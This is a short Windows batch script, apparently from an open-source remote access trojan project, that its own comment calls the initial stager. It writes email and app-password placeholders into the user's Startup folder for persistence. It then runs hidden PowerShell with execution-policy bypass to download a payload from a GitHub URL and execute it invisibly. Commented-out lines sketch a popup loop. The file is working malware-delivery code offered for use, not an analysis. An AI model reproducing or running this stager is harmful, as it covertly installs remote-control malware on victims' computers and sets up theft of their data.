@echo off

@rem initial stager for the rat

set MLrZWNKzXe="examplemail@gmail.com"
set JKgSYUywNCvkasmW="your app password"
set CLXduxKZAneOtWBob=%cd%
set hOEiKdgQksaVGwf=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup

@rem go to startup
cd %hOEiKdgQksaVGwf%
echo %MLrZWNKzXe%>KHPWMpTitfZ.txt
echo %JKgSYUywNCvkasmW%>oSyEZsgTWIU.txt

@rem Download payload
powershell powershell.exe -noP -W hidden -ep bypass -c "iwr -uri 'https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/payloads/1.cmd' -outfile '.\wLMZNyTDPjiugBO.cmd'"

@rem run the payload
powershell -noprofile -w hidden start-process powershell.exe -windowstyle hidden ".\wLMZNyTDPjiugBO.cmd"

@rem move back to saved directory
cd %CLXduxKZAneOtWBob%

@REM del smtp-installer.cmd

@REM (
@REM     echo @echo off
@REM     echo :loop
@REM     echo start /min cmd /c "popup.vbs"
@REM     echo goto loop
@REM )>payload.cmd

